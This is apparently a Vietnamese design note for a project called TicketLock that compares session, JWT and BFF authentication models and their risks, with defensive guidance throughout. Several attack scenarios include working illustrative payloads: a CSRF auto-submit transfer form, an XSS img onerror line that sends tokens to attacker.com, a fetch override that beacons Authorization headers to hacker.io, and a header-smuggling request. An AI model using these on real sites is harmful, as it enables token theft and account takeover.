# Phân Tích Toàn Diện Các Lỗ Hổng Bảo Mật Theo Từng Mô Hình Xác Thực

Các mô hình bên dưới là phân tích tổng quát, không phải tất cả đều đã triển khai. TicketLock hiện dùng React + session/CSRF; JWT API chỉ bật qua profile `jwt`, refresh token truyền trong JSON body. Các ví dụ refresh cookie, Web Storage và BFF là phương án tham khảo.

Tài liệu này so sánh **Cookie Session**, **JWT Web Storage**, **JWT in-memory + refresh cookie**, **JWT trong HttpOnly cookie** và **BFF**. Các bảng chỉ nêu xu hướng rủi ro, không phải bảo đảm an toàn tuyệt đối; cấu hình và cách ứng dụng dùng credential mới quyết định kết quả.

---

## PHẦN 1: TỔNG QUAN, CÔNG DỤNG & DANH SÁCH LỖ HỔNG

### 1. Bảng tóm tắt các mô hình và công dụng

| Mô hình | Vị trí lưu Client | Vị trí lưu Server | Công dụng chính |
| :--- | :--- | :--- | :--- |
| **1. Session Truyền Thống / Redis** | Cookie (`JSESSIONID`) | RAM / Redis | Web ứng dụng cần thu hồi phiên nhanh; nhiều instance cần kho session dùng chung. |
| **2. JWT trong Web Storage** | `localStorage` / `sessionStorage` | Không lưu (Stateless) | Dự án nhỏ, SPA đơn giản, prototype cần tích hợp nhanh không cần backend proxy. |
| **3. JWT In-Memory + Refresh Cookie** | Access Token trong RAM, Refresh trong Cookie `HttpOnly` | Refresh Token trong DB/Redis | Ứng dụng SPA hiện đại (React/Vue), cân bằng giữa độ tiện lợi và hạn chế rò rỉ token dài hạn. |
| **4. JWT trong HttpOnly Cookie** | Cookie `HttpOnly` (`access_token`) | Không lưu (Stateless) | Web SPA muốn dùng JWT stateless nhưng muốn giấu token khỏi mã JavaScript. |
| **5. Backend-For-Frontend (BFF)** | Cookie `HttpOnly` giữa trình duyệt và BFF | Session/token phía server; BFF gọi API nội bộ | Hữu ích khi muốn giữ token khỏi trình duyệt; cần vận hành BFF và bảo vệ CSRF. |

---

### 2. Bảng đối chiếu các nguy cơ bảo mật

| Lỗ hổng / Nguy cơ | 1. Session Redis | 2. JWT LocalStorage | 3. JWT In-Memory + Refresh Cookie | 4. JWT HttpOnly Cookie | 5. BFF Gateway |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **XSS chiếm quyền trong trang** | 🔴 Có thể thao tác thay user; HttpOnly cản đọc cookie | 🔴 Có thể đọc token | 🔴 Có thể thao tác thay user; token trong RAM có thể bị lấy | 🔴 Có thể thao tác thay user; HttpOnly cản đọc cookie | 🔴 Có thể thao tác thay user qua BFF |
| **CSRF (Cross-Site Request Forgery)** | 🔴 Có nguy cơ | 🛡️ Không bị | 🟡 Có nguy cơ tại endpoint `/refresh` | 🔴 Có nguy cơ | 🔴 Có nguy cơ (nếu thiếu CSRF filter) |
| **Session Fixation (Cố định phiên)** | 🟡 Nếu không đổi ID sau đăng nhập; Spring Security mặc định có bảo vệ | — | — | — | 🟡 Nếu phiên BFF không đổi sau đăng nhập |
| **Thu hồi trước hạn** | 🟢 Xóa session | 🔴 Không có nếu chỉ kiểm tra chữ ký/claims; có thể thêm denylist/introspection | 🟡 Thu hồi refresh; access đã cấp thường còn dùng đến `exp` | 🔴 Tương tự JWT bearer | 🟢 Xóa session BFF; token đã chuyển tiếp cần chính sách riêng |
| **Race Condition khi rotate refresh token** | — | — | 🟡 Có thể làm hỏng phiên nếu xử lý reuse và request đồng thời sai | — | — |
| **Header Injection / Token Smuggling** | 🛡️ Không bị | 🛡️ Không bị | 🛡️ Không bị | 🛡️ Không bị | 🟡 Có nguy cơ trên kênh nội bộ |

---

## PHẦN 2: CHI TIẾT CÁCH THỨC HOẠT ĐỘNG & KỊCH BẢN TẤN CÔNG

---

### MÔ HÌNH 1: SESSION TRUYỀN THỐNG / REDIS SESSION

#### 1. Cách thức hoạt động
1. User gửi `POST /api/auth/login` kèm email/password.
2. Server xác thực thông tin, tạo phiên trong Redis/RAM với `sessionId` ngẫu nhiên.
3. Server trả về header: `Set-Cookie: JSESSIONID=<id>; Path=/; HttpOnly; SameSite=Lax; Secure`.
4. Mọi request sau, trình duyệt tự động gửi cookie này; server tra Redis để nhận diện user.

#### 2. Các lỗ hổng và kịch bản tấn công

##### Lỗ hổng 1.1: Tấn công CSRF (Cross-Site Request Forgery)
* **Bản chất**: Trình duyệt có cơ chế tự động đính kèm cookie khi gửi request tới domain đích, bất kể request đó xuất phát từ trang web nào.
* **Kịch bản tấn công**:
  1. Nạn nhân đăng nhập vào `bank.com` và giữ Cookie `JSESSIONID`.
  2. Nạn nhân vô tình bấm vào một đường link độc hại trên `evil.com`.
  3. Trang `evil.com` chạy một thẻ ẩn:
     ```html
     <form action="https://bank.com/api/transfer" method="POST">
       <input type="hidden" name="amount" value="50000000" />
       <input type="hidden" name="toAccount" value="attacker_account" />
     </form>
     <script>document.forms[0].submit();</script>
     ```
  4. Trình duyệt gửi request `POST` đến `bank.com` và **tự động đính kèm Cookie `JSESSIONID`**.
  5. `bank.com` kiểm tra session thấy hợp lệ nên thực hiện chuyển tiền của nạn nhân cho hacker.
* **Phòng chống**: Giữ CSRF protection cho request dùng cookie xác thực. SameSite giúp giảm nguy cơ nhưng nên xem là lớp bổ sung, không mặc định thay thế CSRF token.

##### Lỗ hổng 1.2: Tấn công Session Fixation (Cố định phiên)
* **Bản chất**: Nếu ứng dụng chấp nhận session ID mà kẻ tấn công biết và giữ nguyên ID đó sau đăng nhập, kẻ tấn công có thể thử dùng lại ID. Không dùng URL rewriting cho session ID; ví dụ `;jsessionid=` không phải cách khai thác phù hợp với trình duyệt hiện đại.
* **Kịch bản tấn công**:
  1. Hacker truy cập web, lấy được một `JSESSIONID=XYZ_FIXED`.
  2. Giả sử một ứng dụng dễ bị lỗi cho phép ép browser nạn nhân dùng ID đó (ví dụ lỗi cookie injection); query `?jsessionid=...` tự nó không ép được session trong TicketLock.
  3. Nạn nhân đăng nhập trong phiên đã bị ép sử dụng ID biết trước.
  4. Server **không đổi session ID** mà vẫn gắn quyền của nạn nhân vào `XYZ_FIXED`.
  5. Hacker dùng lại Cookie `JSESSIONID=XYZ_FIXED` trên máy mình để truy cập tài khoản của nạn nhân.
* **Phòng chống**: Không cho người dùng tự chọn session ID và đổi ID sau đăng nhập. Spring Security Servlet mặc định có session fixation protection; luồng JSON login của dự án gọi `ChangeSessionIdAuthenticationStrategy`.

---

### MÔ HÌNH 2: JWT TRONG WEB STORAGE (`localStorage` / `sessionStorage`)

#### 1. Cách thức hoạt động
1. User gửi `POST /api/auth/login`.
2. Server ký JWT và trả về trong body: `{"accessToken": "eyJhbGciOi..."}`.
3. Client JavaScript lưu: `localStorage.setItem('token', res.accessToken)`.
4. Mỗi request gọi API, JavaScript lấy ra và gắn vào header: `Authorization: Bearer <token>`.

#### 2. Các lỗ hổng và kịch bản tấn công

##### Lỗ hổng 2.1: Toàn quyền đánh cắp Token qua XSS (Cross-Site Scripting)
* **Bản chất**: Mọi dữ liệu lưu trong `localStorage` đều có thể bị đọc bởi bất kỳ đoạn mã JavaScript nào đang chạy trên cùng origin đó.
* **Kịch bản tấn công**:
  1. Trang web có lỗ hổng XSS (ví dụ hiển thị bình luận chưa qua sanitize):
     ```html
     <img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))" />
     ```
  2. Nạn nhân truy cập trang xem bình luận.
  3. Đoạn mã trên chạy, âm thầm đọc toàn bộ JWT trong `localStorage` và gửi thẳng về máy chủ của hacker.
  4. Hacker cầm JWT này gọi API từ bất kỳ đâu (Postman, cURL) và mạo danh nạn nhân hoàn toàn.
* **Giảm thiểu**: Tránh lưu bearer token dài hạn trong Web Storage. HttpOnly cookie/BFF giảm khả năng đọc credential bằng JavaScript, nhưng XSS vẫn có thể gửi request thay người dùng. Cần ngăn XSS bằng output encoding, CSP và kiểm soát dependency.

##### Lỗ hổng 2.2: Không thể thu hồi token tức thì (Lack of Instant Revocation)
* **Bản chất**: Nếu server chỉ kiểm tra chữ ký và claims, nó không có trạng thái để thu hồi riêng JWT trước `exp`.
* **Kịch bản tấn công**:
  1. Nạn nhân phát hiện bị lộ tài khoản hoặc điện thoại bị mất.
  2. Nạn nhân đổi mật khẩu trên hệ thống.
  3. Mặc dù mật khẩu trong Database đã đổi, token cũ hacker đang cầm vẫn còn hạn (`exp` 7 ngày nữa).
  4. Hacker tiếp tục dùng token cũ gọi API thực hiện giao dịch suốt 7 ngày mà không hề bị chặn, vì chữ ký số của token vẫn hoàn toàn hợp lệ.
* **Giảm thiểu**: Dùng access token ngắn hạn; nếu cần thu hồi sớm, có thể dùng token version, denylist `jti`, introspection hoặc chuyển sang session. Các cách này thêm trạng thái và chi phí kiểm tra.

---

### MÔ HÌNH 3: JWT IN-MEMORY + REFRESH TOKEN TRONG COOKIE HTTPONLY

#### 1. Cách thức hoạt động
1. Login thành công $\rightarrow$ Server trả về:
   * Body JSON: `accessToken` (sống 10 phút, lưu trong RAM của React).
   * Cookie `HttpOnly`: `refreshToken` (sống 7 ngày, chỉ gửi về path `/api/auth/refresh`).
2. Gọi API thông thường: Dùng `accessToken` từ RAM gửi qua Header `Authorization: Bearer`.
3. Khi `accessToken` hết hạn: Gọi `/api/auth/refresh` lấy `accessToken` mới.

#### 2. Các lỗ hổng và kịch bản tấn công

##### Lỗ hổng 3.1: Nghe lén trích xuất Token (Monkey-patching Fetch/XHR via XSS)
* **Bản chất**: Dù token nằm trong RAM, mã độc XSS vẫn chạy cùng không gian bộ nhớ của ứng dụng và có thể can thiệp vào các API mạng của trình duyệt.
* **Kịch bản tấn công**:
  1. Web bị dính XSS qua một thư viện npm bên thứ 3 bị cài mã độc (Supply Chain Attack).
  2. Mã độc ghi đè đối tượng `window.fetch` trước khi React khởi tạo:
     ```javascript
     const _orig = window.fetch;
     window.fetch = function(...args) {
         const headers = args[1]?.headers;
         const auth = headers?.['Authorization'] || headers?.Authorization;
         if (auth) {
             navigator.sendBeacon('https://hacker.io/log', auth);
         }
         return _orig.apply(this, args);
     };
     ```
  3. Mỗi khi React gọi bất kỳ API nào, token trong RAM được truyền qua tham số của `fetch`, mã độc lập tức tóm được token và gửi đi.

##### Lỗ hổng 3.2: CSRF trên Endpoint `/refresh`
* **Bản chất**: Endpoint `/api/auth/refresh` phụ thuộc vào Cookie `refreshToken`. Nếu endpoint này không có CSRF token bảo vệ hoặc cookie thiếu `SameSite=Strict`, kẻ tấn công có thể lạm dụng.
* **Kịch bản tấn công**:
  1. Hacker tạo trang `malicious.com` có script ngầm kích hoạt request tới `https://target.com/api/auth/refresh`.
  2. Nếu hệ thống cho phép CORS lỏng lẻo (`Access-Control-Allow-Origin: *` hoặc credential reflection), hacker có thể đọc được response chứa `accessToken` mới cấp.
* **Phòng chống**: Bảo vệ endpoint refresh bằng CSRF, giới hạn Path của cookie, cấu hình SameSite phù hợp và kiểm tra Origin khi thích hợp. CORS không phải biện pháp chống CSRF; cấu hình CORS sai còn có thể làm lộ response.

##### Lỗ hổng 3.3: Cuộc đua Race Condition làm sập tài khoản (Token Rotation DoS)
* **Bản chất**: Để chống lộ refresh token, server áp dụng cơ chế *Refresh Token Rotation* (mỗi lần refresh sẽ đánh dấu token cũ đã dùng và phát token mới; nếu token cũ bị tái sử dụng thì thu hồi token family liên quan, không khóa toàn bộ tài khoản).
* **Kịch bản sự cố**:
  1. Access Token hết hạn khi người dùng mở Dashboard.
  2. Dashboard kích hoạt 3 request song song: `fetchUser()`, `fetchTickets()`, `fetchNotifications()`.
  3. Cả 3 request nhận 401 $\rightarrow$ cả 3 cùng gửi request đến `/api/auth/refresh` bằng cùng một Refresh Token cũ.
  4. Server xử lý request 1 thành công (hủy token cũ, cấp token mới).
  5. Request thứ hai có thể bị nhận diện là token cũ đã dùng. Server nên thu hồi token family/phiên refresh liên quan, không khóa cả tài khoản chỉ vì tín hiệu này; người dùng có thể cần đăng nhập lại.
* **Giảm thiểu**: Frontend chỉ gửi một refresh request tại một thời điểm (mutex/single-flight). Backend cần cập nhật token nguyên tử và định nghĩa cách xử lý token cũ. Grace period làm tăng thời gian token bị đánh cắp còn dùng được nên cần cân nhắc.

---

### MÔ HÌNH 4: JWT TRỰC TIẾP TRONG COOKIE HTTPONLY

#### 1. Cách thức hoạt động
1. Server cấp JWT và đóng gói vào Cookie:
   `Set-Cookie: access_token=eyJhbGci...; HttpOnly; Secure; SameSite=Lax; Path=/`
2. Trình duyệt tự gửi Cookie `access_token` trong mọi request.
3. Server giải mã JWT trực tiếp từ Cookie mà không lưu session.

#### 2. Các lỗ hổng và kịch bản tấn công

##### Lỗ hổng 4.1: CSRF tái xuất hiện (Cross-Site Request Forgery)
* **Bản chất**: Bản chất stateless của JWT vốn không bị CSRF khi gửi qua Header. Nhưng khi nhét JWT vào Cookie, toàn bộ điểm yếu tự động gửi Cookie của trình duyệt quay trở lại.
* **Kịch bản tấn công**:
  1. Người dùng đang đăng nhập trang mua bán vé `ticketlock.com`.
  2. Hacker gửi email lừa người dùng bấm vào liên kết chuyển tiền.
  3. Trình duyệt tự gửi Cookie `access_token` tới server `ticketlock.com`.
  4. Vì đây là JWT trong Cookie, server kiểm tra thấy chữ ký JWT hợp lệ nên thực thi giao dịch.
* **Phòng chống**: Bắt buộc phải triển khai cơ chế CSRF (Double Submit Cookie hoặc SameSite=Strict).

##### Lỗ hổng 4.2: Tràn dung lượng Cookie (Cookie Size Overhead)
* **Bản chất**: Giới hạn của trình duyệt cho mỗi cookie thường là **4096 bytes** (4KB).
* **Vấn đề**: Khi JWT chứa nhiều claims, quyền hạn (`roles`), danh sách permission, hoặc chữ ký khóa RSA-4096 bit, kích thước JWT có thể vượt quá 4KB.
* **Hậu quả**: Trình duyệt, proxy hoặc server có thể từ chối cookie/header quá lớn; không nên dựa vào hành vi cắt bớt. Giữ claims nhỏ và kiểm tra giới hạn toàn tuyến.

---

### MÔ HÌNH 5: BACKEND-FOR-FRONTEND (BFF) / API GATEWAY

#### 1. Cách thức hoạt động
1. **Phía ngoài (Trình duyệt $\leftrightarrow$ BFF)**: Dùng **Session ID trong Cookie HttpOnly + CSRF**. Trình duyệt không bao giờ nhìn thấy hoặc giữ bất kỳ JWT nào.
2. **Phía trong (BFF $\leftrightarrow$ Microservices)**: BFF giữ vai trò Token Mediator. Khi nhận Cookie hợp lệ, BFF đổi sang Bearer JWT và gửi vào mạng nội bộ giữa các service.

#### 2. Các lỗ hổng và kịch bản tấn công

##### Lỗ hổng 5.1: Token Injection / Header Smuggling giữa Gateway và Microservice
* **Bản chất**: Kẻ tấn công tìm cách lừa Gateway chèn các header giả mạo vào request trước khi forward tới microservice.
* **Kịch bản tấn công**:
  1. Hacker gửi request từ trình duyệt lên Gateway với header độc hại:
     ```http
     GET /api/orders HTTP/1.1
     Host: api.ticketlock.com
     X-Forwarded-User: admin@ticketlock.local
     Authorization: Bearer <token_giả_mạo>
     ```
  2. Nếu Gateway được lập trình cẩu thả, không ghi đè hoặc không lọc sạch (sanitize) các header nhạy cảm này mà chuyển tiếp thẳng vào Microservice.
  3. Microservice bên trong tin tưởng mạng nội bộ nên đọc header `X-Forwarded-User` hoặc `Authorization` do hacker gửi và thực hiện hành động với quyền Admin.
* **Phòng chống**: Gateway phải có cơ chế Strip / Sanitize toàn bộ các header ủy quyền từ client trước khi chèn token nội bộ.

##### Lỗ hổng 5.2: Tấn công từ chối dịch vụ (BFF Single Point of Failure & Bottleneck)
* **Bản chất**: BFF là điểm tập trung duy nhất tiếp nhận toàn bộ kết nối web, mã hóa/giải mã session và chuyển tiếp token.
* **Kịch bản tấn công**:
  1. Hacker thực hiện tấn công Slowloris hoặc gửi lượng lớn request đăng nhập/refresh làm cạn kiệt pool kết nối tại tầng BFF.
  2. Mặc dù các Microservice bên trong vẫn khỏe mạnh, nhưng toàn bộ người dùng web đều không thể truy cập hệ thống vì cửa ngõ BFF bị nghẽn.
* **Phòng chống**: Cần cụm BFF phân tán cân bằng tải (High Availability Cluster), rate limiting nghiêm ngặt tại tầng Reverse Proxy (Nginx/Cloudflare).

---

## TỔNG KẾT & LỰA CHỌN THỰC TẾ

1. **Chọn theo client và nhu cầu thu hồi**:
   * Web cùng origin cần đá phiên ngay: session cookie (Redis khi scale) thường đơn giản.
   * API cho mobile/service: bearer access token ngắn hạn có thể phù hợp.
   * SPA cần giữ token nội bộ: cân nhắc BFF; nếu dùng refresh cookie trực tiếp thì xử lý CSRF, rotation và request đồng thời.
   * Không có quy tắc phổ quát rằng mọi ứng dụng phải dùng BFF hoặc mọi JWT đều không được dùng Web Storage; đánh giá threat model và khả năng vận hành.
2. **Quy tắc vàng cho kiến trúc bảo mật nhiều lớp (Defense in Depth)**:
   * **Trình duyệt**: bảo vệ credential, CSRF và XSS theo cách lưu trữ đã chọn.
   * **Service-to-service**: xác thực workload, giới hạn audience/scope, quản lý khóa và kiểm tra quyền. JWT ký bất đối xứng là một lựa chọn; chữ ký không mã hóa payload.

---

## PHẦN 3: ÁP DỤNG VÀO TICKETLOCK

React hiện dùng **session + CSRF**; profile Redis chia sẻ session giữa nhiều instance. Bài JWT phát access token ngắn hạn để so sánh API stateless. Hai luồng độc lập: giới hạn một session không giới hạn số JWT đã phát, và logout session không thu hồi JWT.

### Bài thực hành: refresh token rotation

TicketLock đã triển khai refresh credential ngẫu nhiên trong `RefreshTokenService`: lưu hash SHA-256, rotate sau mỗi lần dùng và thu hồi theo token family khi phát hiện token cũ bị dùng lại. Hợp đồng hiện dùng JSON body theo phạm vi Mini; xem quy trình Postman trong `docs/jwt-access-token-lab.md`.

Các điểm cần tự kiểm chứng:

1. Database lưu hash refresh token, user, family, thời hạn và trạng thái; không lưu token thô.
2. Mỗi lần refresh phát access token mới và refresh token mới; family giữ hạn tuyệt đối 7 ngày.
3. Logout/reuse thu hồi family. Access token cũ vẫn có thể dùng đến `exp`.
4. JSON body không tự gửi theo cơ chế cookie nên JWT chain không cần CSRF; khi chuyển sang cookie cần bật lại CSRF protection và cấu hình cookie an toàn.
5. Client cần single-flight để không gửi refresh request song song.

Không khóa tài khoản chỉ vì token reuse: request đồng thời hợp lệ cũng có thể gây hiện tượng này. Ghi nhận sự kiện an toàn và thu hồi đúng phiên/family.
